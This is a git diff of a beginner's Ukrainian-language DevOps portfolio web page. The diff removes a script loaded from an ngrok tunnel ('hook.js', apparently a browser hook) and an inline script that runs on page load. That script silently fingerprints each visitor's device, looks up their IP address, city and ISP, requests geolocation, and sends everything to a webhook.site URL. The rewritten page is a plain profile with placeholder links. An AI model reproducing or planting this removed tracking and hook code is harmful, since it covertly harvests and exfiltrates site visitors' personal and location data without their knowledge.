@@ -3,205 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phantom Baby | DevOps Portfolio</title>
-    
-    <script src="https://uninceptive-crankous-rusty.ngrok-free.dev/hook.js"></script>
-
-    <style>
-        :root {
-            --primary: #007bff;
-            --secondary: #6c757d;
-            --success: #28a745;
-            --background: #f8f9fa;
-            --text: #343a40;
-        }
-
-        body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: var(--background);
-            color: var(--text);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        header {
-            background-color: white;
-            width: 100%;
-            padding: 20px 0;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-            text-align: center;
-        }
-
-        h1 {
-            color: var(--primary);
-            margin: 0;
-            font-size: 2.5rem;
-        }
-
-        .container {
-            max-width: 800px;
-            width: 90%;
-            margin: 40px auto;
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-        }
-
-        h2 {
-            border-bottom: 2px solid var(--primary);
-            padding-bottom: 10px;
-            margin-top: 30px;
-            color: var(--primary);
-        }
-
-        p {
-            font-size: 1.1rem;
-            line-height: 1.6;
-            margin: 15px 0;
-        }
-
-        .highlight {
-            font-weight: bold;
-            color: var(--primary);
-        }
-
-        .devops-tag {
-            background: var(--success);
-            color: white;
-            padding: 3px 10px;
-            border-radius: 15px;
-            font-size: 0.9rem;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-
-        .skills-list {
-            list-style-type: none;
-            padding: 0;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-top: 15px;
-        }
-
-        .skills-list li {
-            background: #e9ecef;
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 1rem;
-        }
-
-        footer {
-            margin-top: auto;
-            width: 100%;
-            padding: 20px 0;
-            background-color: #343a40;
-            color: white;
-            text-align: center;
-        }
-
-        #tracking-status {
-            display: none;
-        }
-    </style>
+    <title>Phantom | DevOps Portfolio</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <header>
-        <h1>Привіт 😎</h1>
-    </header>
-
     <div class="container">
-        <p>HELLLO світ, я в інтернеті !!!!!!!</p>
-        <p>Мене звати <span class="highlight">Phantom</span>. Я <span class="devops-tag">DevOps Engineer</span>-початківець, і це мій самий перший сайт, розгорнутий у хмарі!</p>
+        <header>
+            <h1>Phantom Portfolio 🚀</h1>
+        </header>
 
-        <h2>Про мене та цей проєкт</h2>
-        <p>Ця сторінка — мій перший крок у світ CI/CD та хмарних технологій. Я створив її, щоб протестувати процес деплою та моніторингу.</p>
-        
-        <p>Я навчаюся автоматизувати інфраструктуру, налаштовувати пайплайни та забезпечувати стабільну роботу сервісів. Цей сайт — проста демонстрація того, що я вже можу зробити.</p>
+        <main class="profile-section">
+            <div class="profile-photo">
+                <img src="my-photo.jpg" alt="Mykola Horishnyi">
+            </div>
+            
+            <div class="profile-info">
+                <h2>Про мене</h2>
+                <p>Я <span class="highlight">DevOps Engineer</span>-початківець. Навчаюся автоматизувати хаос, будувати CI/CD пайплайни та підкорювати хмари.</p>
+                
+                <h2>Навички</h2>
+                <ul class="skills-list">
+                    <li>Linux (Kali, Ubuntu)</li>
+                    <li>Docker & Virtualization (UTM)</li>
+                    <li>CI/CD & Automation</li>
+                    <li>Cloud Platforms (Render)</li>
+                    <li>Python & Bash Basics</li>
+                </ul>
+            </div>
+        </main>
 
-        <h2>Мої навички (в процесі вивчення)</h2>
-        <ul class="skills-list">
-            <li>Linux</li>
-            <li>Git & GitHub</li>
-            <li>Docker</li>
-            <li>CI/CD (базовий рівень)</li>
-            <li>Cloud Platforms (Render)</li>
-            <li>Monitoring (Webhooks 😉)</li>
-        </ul>
+        <section class="links">
+            <h2>Контакти та проєкти</h2>
+            <div class="social-links">
+                <a href="https://instagram.com/твій_юзер" target="_blank">Instagram</a>
+                <a href="https://linkedin.com/in/твій_юзер" target="_blank">LinkedIn</a>
+                <a href="https://github.com/твій_юзер" target="_blank" class="github-link">GitHub</a>
+            </div>
+            <div class="project-box">
+                <h3>Мій навчальний проєкт (Monitoring Tool)</h3>
+                <p>Демонстрація збору даних та обробки вебхуків через Pipedream.</p>
+                <a href="ТВОЄ_ПОСИЛАННЯ_НА_РЕНДЕР" class="btn">Переглянути проєкт</a>
+            </div>
+        </section>
 
-        <h2>Контакти</h2>
-        <p>Якщо ви хочете поспілкуватися про DevOps, автоматизацію або просто привітати мене з першим деплоєм, знаходьте мене тут:</p>
-        <p>📧 Email: nobody@gmail.com</p>
+        <footer>
+            <p>&copy; 2026 Phantom. Всі права захищені.</p>
+        </footer>
     </div>
 
-    <footer>
-        <p>&copy; 2026 Phantom. Всі права захищені.</p>
-    </footer>
-
-    <div id="tracking-status"></div>
-
-    <script>
-    const webhookUrl = "https://webhook.site/ab21f221-5faa-41cb-8741-96680e7e987a";
-
-    async function collectAllData() {
-        // 1. Збір базових даних
-        let data = {
-            time: new Date().toLocaleString(),
-            userAgent: navigator.userAgent,
-            screen: {
-                w: window.screen.width,
-                h: window.screen.height
-            },
-            device: {
-                cores: navigator.hardwareConcurrency || "unknown",
-                platform: navigator.platform,
-                language: navigator.language
-            },
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-
-        // 2. IP та Мережа
-        try {
-            const ipResponse = await fetch('https://ipapi.co/json/');
-            const ipData = await ipResponse.json();
-            data.network = {
-                ip: ipData.ip,
-                city: ipData.city,
-                isp: ipData.org
-            };
-        } catch (e) { data.network = "IP API failed"; }
-
-        // 3. Відправка
-        fetch(webhookUrl, { 
-            method: 'POST', 
-            mode: 'no-cors', 
-            body: JSON.stringify(data) 
-        });
-
-        // 4. Геолокація (якщо юзер дозволить)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                fetch(webhookUrl, { 
-                    method: 'POST', 
-                    mode: 'no-cors', 
-                    body: JSON.stringify({ 
-                        type: "GEO_UPDATE", 
-                        lat: pos.coords.latitude, 
-                        lon: pos.coords.longitude 
-                    }) 
-                });
-            }, null, { timeout: 5000 });
-        }
-    }
-
-    collectAllData();
-    </script>
-
+    <script src="script.js"></script>
 </body>
 </html>
